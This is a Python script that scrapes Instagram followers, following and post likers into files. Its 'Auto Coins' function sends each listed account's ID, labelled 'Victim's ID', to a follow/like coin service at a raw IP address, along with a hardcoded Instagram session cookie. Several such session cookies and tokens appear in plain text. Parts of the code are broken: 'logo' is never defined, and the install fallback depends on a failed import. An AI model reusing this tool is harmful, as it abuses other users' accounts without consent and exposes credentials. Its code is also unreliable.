try:
 import requests,uuid,instaloader,os
except ModuleNotFoundError:
 os.system('pip install instaloader')
 os.system('pip install requests')
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'

def Followers():
 os.system('clear')
 print(logo)
 L = instaloader.Instaloader()
 username=input(G+'[+] UserName ==> ')
 password=input(S+'[+] PassWord ==> ')
 getuser=input(B+'[+] User To Get Followers ==> ')
 os.system(f'rm -rf followers.txt')
 L.login(username,password)
 profile = instaloader.Profile.from_username(L.context, getuser)
 follow_list = []
 count=0
 for followee in profile.get_followers():
    follow_list.append(followee.username)
    file = open(f"followers.txt","a+")
    file.write(follow_list[count])
    file.write("\n")
    file.close()
    print(follow_list[count])
    count=count+1
def Likes():
 os.system('clear')
 print(logo)
 media=input('[◇] Media URL ==> ')
 os.system('rm -rf like.txt')
 url=f'http://api.instagram.com/oembed?url={media}'
 whisper=requests.get(url)
 mediaid=whisper.json()['media_id']
 url=f'https://i.instagram.com/api/v1/media/{mediaid}/likers/'
 head={'Host': 'i.instagram.com',
'Connection': 'keep-alive',
'X-IG-Connection-Type': 'WIFI',
'X-IG-Capabilities': '3Ro=',
'Accept-Language': 'ar-AE',
'Cookie': 'mid=YeigMAABAAFMEFsC25itsMXRyBbm; ig_did=B3506D82-E828-485C-AE46-14511B54DFD0; ig_nrcb=1; csrftoken=Kr0m2ZT5o54coqGGm86kxPoGzjvHsTSy; ds_user_id=8434645708; sessionid=51504156294%3AfROCTRSPA60FMa%3A26; shbid="9176\0548434645708\0541674171546:01f7d48d161bbfc55baad4c92541ab26d2f9542285479b5c44cf47446250cd2797d8d453"; shbts="1642635546\0548434645708\0541674171546:01f7a137cebe03c17a70180b5e820fead18ce91518a24b6a08743f8b1f0523c18f26a9bb"; rur="LDC\0548434645708\0541674171546:01f70778426ad879bf3b4bec4d17752e5b27508475682dccd8ecc3848a12fa33cf4caa54"',
'User-Agent':'Instagram 84.0.522.52 Android (23/6.0.1; 640dpi; 1440x2392; LGE/lge; RS988; h1; h1; en_US)'}
 mn = 0
 whisper=requests.get(url,headers=head).json()
 try:
  while True:
   mn+=1
   y=str(whisper['users'][mn]['username'])
   print(y)
   file = open(f"like.txt","a+")
   file.write(y+'\n')
 except IndexError:
  exit()
def Following():
 os.system('clear')
 print(logo)
 L = instaloader.Instaloader()
 username=input(G+'[+] UserName ==> ')
 password=input(S+'[+] PassWord ==> ')
 getuser=input(B+'[+] User To Get Followings ==> ')
 os.system(f'rm -rf following.txt')
 L.login(username,password)
 profile = instaloader.Profile.from_username(L.context, getuser)
 follow_list = []
 count=0
 for followee in profile.get_followees():
    follow_list.append(followee.username)
    file = open(f"following.txt","a+")
    file.write(follow_list[count])
    file.write("\n")
    file.close()
    print(follow_list[count])
    count=count+1
def Fira(id,user,firauser):
 url = "http://185.231.59.247/fira_instaupfffffffff/"
 data = {'inscoo':'Cookie: mid=YfSEswABAAFmQ6L5Gfj4D9whRc6X; ig_did=69C34B0F-85B9-4A91-AC96-587A781EF0B4; ig_nrcb=1; csrftoken=gnnhneuo8JEVczHZJVvgodz39lUcaQwn; ds_user_id=51504156294; sessionid=51504156294%3AfROCTRSPA60FMa%3A26; rur="LDC\05451504156294\0541674950726:01f7d0ac6419ed83335a9d82168915bf5b52424052b89c50aaf5bdb046d75e06d0f9605d',
 'pkx':id,
 'uname':firauser,
 'submit':'submit'}
 whisper=requests.post(url,data=data)
 info=str(whisper.text)
 like=str(info.split('Like Coin- :')[1])
 likecoin=like.split('<br>')[0]
 follow=str(info.split('Follow Coin- :')[1])
 followcoin=follow.split('\n')[0]
 inf=(f"""{B}[‍🖤] Victim's ID ==> {id}
{S}[💕] Victim's User ==> {user}
{S}[👥] Follow Coin ==> {followcoin}
{S}[❤] Like Coin ==> {likecoin}""")
 if 'Status- : ok' in info:
  print(f"""{G}[💕] Send To ==> {firauser}
{inf}
{G}[✅] Succsses""")
 if 'Status- : nok' in info:
  print(f"""{inf}
{E}[❌] Not Succsses""")
 if 'Blocked' in info:
  print(f"""{E}[🚫] Blocked User""")
 else:
  print(inf)
def UserID(user,firauser):
 L = instaloader.Instaloader()
 profile = str(instaloader.Profile.from_username(L.context,user))
 idd=str(profile.split(')>')[0])
 id=idd.split(' (')[1]
 Fira(id,user,firauser)
def Start():
 os.system('clear')
 print(logo)
 file=input(B+'[+] Users File Path ==> ')
 firauser=input('[+] Enter User To Send The Coins ==> ')
 for Whisper in open(file,'r').read().splitlines():
  username=str(Whisper.split('\n')[0])
  if 'instagram.com' in username:
   u=str(username.split('com/')[1])
   us=str(u.split('?')[0])
   user=us
  else:
   user=username
  UserID(user,firauser)
os.system('clear')
print(logo)
Choose=input(f'''{S}[1] Get Users From Followers
{E}[2] Get Users From Following
{B}[3] Get Users From Likes
{B}[4] Auto Coins
{G}[+] Choose ==> ''')
if Choose == '1':
 Followers()
if Choose == '2':
 Following()
if Choose == '3':
 Likes()
if Choose == '4':
 Start()